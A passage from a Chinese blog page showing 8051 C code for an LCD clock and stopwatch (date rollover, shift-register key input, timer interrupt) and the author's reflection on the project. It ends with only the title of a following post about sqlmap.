class="keyword">if</span>(time[<span class="number">1</span>] &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">						<span class="keyword">if</span>(time[<span class="number">0</span>]%<span class="number">4</span> == <span class="number">0</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>(time[<span class="number">2</span>] == <span class="number">29</span>) &#123;</span><br><span class="line">								time[<span class="number">1</span>]++;</span><br><span class="line">								time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							<span class="keyword">if</span>(time[<span class="number">2</span>] == <span class="number">28</span>) &#123;</span><br><span class="line">								time[<span class="number">1</span>]++;</span><br><span class="line">								time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">							&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; 		</span><br><span class="line">	&#125;</span><br><span class="line">	clock.Year = time[<span class="number">0</span>];</span><br><span class="line">	clock.Month = time[<span class="number">1</span>];</span><br><span class="line">	clock.Day = time[<span class="number">2</span>];</span><br><span class="line">	clock.Hour = time[<span class="number">3</span>];</span><br><span class="line">	clock.Minute = time[<span class="number">4</span>];</span><br><span class="line">	clock.Second = time[<span class="number">5</span>];					</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secondCalc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	secMs10++;</span><br><span class="line">	<span class="keyword">if</span>(secMs10 == <span class="number">1</span>) &#123;</span><br><span class="line">		second[<span class="number">2</span>] += <span class="number">1</span>;</span><br><span class="line">		secMs10 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(second[<span class="number">2</span>] == <span class="number">99</span>) &#123;</span><br><span class="line">			second[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">			second[<span class="number">1</span>]++;</span><br><span class="line">			<span class="keyword">if</span>(second[<span class="number">1</span>] == <span class="number">60</span>) &#123;</span><br><span class="line">				second[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">				second[<span class="number">0</span>]++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="u952E_u76D8_u5904_u7406"><a href="#u952E_u76D8_u5904_u7406" class="headerlink" title="键盘处理"></a>键盘处理</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;reg51.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;key.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;hc165.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;lcd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> flash;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> position;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> data time[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mode = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> clearFlag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> startFlag = <span class="number">1</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">keyControl</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	flag = hc165_re();</span><br><span class="line">	Delay1ms(<span class="number">100</span>);</span><br><span class="line">	flag = hc165_re();</span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0xfe</span>) &#123;</span><br><span class="line">		mode = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0xfd</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(startFlag == <span class="number">0</span>)</span><br><span class="line">			startFlag = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			startFlag = <span class="number">0</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0xfb</span>) &#123;</span><br><span class="line">		flash = <span class="number">1</span>;</span><br><span class="line">		clearFlag = <span class="number">0</span>;</span><br><span class="line">	&#125;				 </span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0x7f</span>) &#123;</span><br><span class="line">		flash = <span class="number">0</span>;</span><br><span class="line">		position = <span class="number">0</span>;</span><br><span class="line">		mode = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0xf7</span>) &#123;</span><br><span class="line">		Delay1ms(<span class="number">100</span>);</span><br><span class="line">		position = position - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(position &lt; <span class="number">0</span>)</span><br><span class="line">			position = <span class="number">13</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0xef</span>) &#123;</span><br><span class="line">		Delay1ms(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		position = position + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(position &gt; <span class="number">13</span>)</span><br><span class="line">			position = <span class="number">0</span>;</span><br><span class="line">	&#125;		 </span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0xdf</span> &amp;&amp; flash == <span class="number">1</span>) &#123;</span><br><span class="line">		Delay1ms(<span class="number">100</span>);</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]/<span class="number">1000</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;	</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] += <span class="number">1000</span>;		 			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]/<span class="number">100</span>%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] += <span class="number">100</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]/<span class="number">10</span>%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] += <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">3</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] += <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">4</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">1</span>]/<span class="number">10</span>%<span class="number">10</span> &gt; <span class="number">0</span>)</span><br><span class="line">				time[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">1</span>] += <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">1</span>]%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">1</span>] += <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">6</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">2</span>]/<span class="number">10</span> &gt; <span class="number">2</span>)</span><br><span class="line">				time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">2</span>] += <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">7</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">2</span>]%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">2</span>] += <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">8</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">3</span>]/<span class="number">10</span> &gt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">3</span>] += <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">9</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">3</span>]%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">3</span>] += <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">10</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">4</span>]/<span class="number">10</span> &gt; <span class="number">4</span>)</span><br><span class="line">				time[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">4</span>] += <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">11</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">4</span>]%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">4</span>] += <span class="number">1</span>;				</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">12</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">5</span>]/<span class="number">10</span> &gt; <span class="number">4</span>)</span><br><span class="line">				time[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">5</span>] += <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">13</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">5</span>]%<span class="number">10</span> &gt; <span class="number">8</span>)</span><br><span class="line">				time[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">5</span>] += <span class="number">1</span>;				</span><br><span class="line">		&#125;</span><br><span class="line">					</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0xbf</span> &amp;&amp; flash == <span class="number">1</span>) &#123;</span><br><span class="line">		Delay1ms(<span class="number">100</span>);</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]/<span class="number">1000</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;	</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] -= <span class="number">1000</span>;		 			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]/<span class="number">100</span>%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] -= <span class="number">100</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]/<span class="number">10</span>%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] -= <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">3</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">0</span>]%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">0</span>] -= <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">4</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">1</span>]/<span class="number">10</span>%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">1</span>] -= <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">1</span>]%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">1</span>] -= <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">6</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">2</span>]/<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">2</span>] -= <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">7</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">2</span>]%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">2</span>] -= <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">8</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">3</span>]/<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">3</span>] -= <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">9</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">3</span>]%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">3</span>] -= <span class="number">1</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">10</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">4</span>]/<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">4</span>] -= <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">11</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">4</span>]%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">4</span>] -= <span class="number">1</span>;				</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">12</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">5</span>]/<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">5</span>] -= <span class="number">10</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(position == <span class="number">13</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">5</span>]%<span class="number">10</span> &lt; <span class="number">1</span>)</span><br><span class="line">				time[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				time[<span class="number">5</span>] -= <span class="number">1</span>;				</span><br><span class="line">		&#125;</span><br><span class="line">					</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="u4E3B_u51FD_u6570_u548C_u4E2D_u65AD"><a href="#u4E3B_u51FD_u6570_u548C_u4E2D_u65AD" class="headerlink" title="主函数和中断"></a>主函数和中断</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;lcd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;hc165.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;clock.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;key.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</span><br><span class="line"><span class="keyword">extern</span> clockTypeDef clock;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> mode;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> data second[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> clearFlag;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> startFlag;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	TH0 = <span class="number">0xd8</span>;</span><br><span class="line">	TL0 = <span class="number">0xf0</span>;</span><br><span class="line">	TMOD = <span class="number">0x01</span>;</span><br><span class="line">	ET0 = <span class="number">1</span>;</span><br><span class="line">	TR0 = <span class="number">1</span>;</span><br><span class="line">	EA = <span class="number">1</span>;</span><br><span class="line">	hc165_init();</span><br><span class="line">	LcdInit();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(mode == <span class="number">0</span>)</span><br><span class="line">			second_display();</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			time_display();</span><br><span class="line">		keyControl();	</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">time_int0</span><span class="params">(<span class="keyword">void</span>)</span> interrupt 1 </span>&#123;</span><br><span class="line"> 	<span class="keyword">unsigned</span> <span class="keyword">char</span> i;</span><br><span class="line">	ET0 = <span class="number">0</span>;</span><br><span class="line">	TR0 = <span class="number">0</span>;</span><br><span class="line">	TH0 = <span class="number">0xd8</span>;<span class="comment">//0x3c;</span></span><br><span class="line">	TL0 = <span class="number">0xf0</span>;<span class="comment">//0xb0;</span></span><br><span class="line">	TR0 = <span class="number">1</span>;</span><br><span class="line">	timeCalc();</span><br><span class="line">	<span class="keyword">if</span>(mode == <span class="number">0</span> &amp;&amp; startFlag == <span class="number">0</span>)</span><br><span class="line">		secondCalc();</span><br><span class="line">	<span class="keyword">if</span>(mode == <span class="number">0</span> &amp;&amp; clearFlag == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">			second[i] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		startFlag = <span class="number">1</span>;</span><br><span class="line">		clearFlag = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	j = j + <span class="number">1</span>;</span><br><span class="line">	ET0 = <span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>从时间的计算上来说这个程序貌似并没有特别麻烦，有很多种实现的方法。这个程序的蛋疼之处在于我们计算出时间后必须将算出的时间逐位取出才能显示，所以增加了很多的工作量。还有就是关于修改时间的问题。通过按键来修改时间再简单不过，问题在于老师要求修改时间时被修改的数要实现闪烁，原来的6位数组不得不拆分成14位，增加了很多代码量。总的来说，因为开始做之前没有提前做好项目的整体规划，导致后期变量很乱，函数的调用函数值的传递也不是很合理。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/嵌入式开发/">嵌入式开发</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2016-03-06-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/06/2016-03-06-sqlmap/" class="article-date">
  	<time datetime="2016-03-06T11:40:25.000Z" itemprop="datePublished">2016-03-06</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/06/2016-03-06-sqlmap/">一桩由sqlmap引发的血案</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
